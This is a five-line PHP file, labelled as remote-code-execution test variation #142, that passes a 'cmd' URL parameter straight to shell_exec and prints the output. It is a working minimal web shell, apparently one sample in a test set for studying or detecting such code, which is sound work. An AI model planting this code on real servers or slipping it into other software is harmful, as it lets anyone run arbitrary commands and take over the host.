<?php
// RCE test variation #142
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>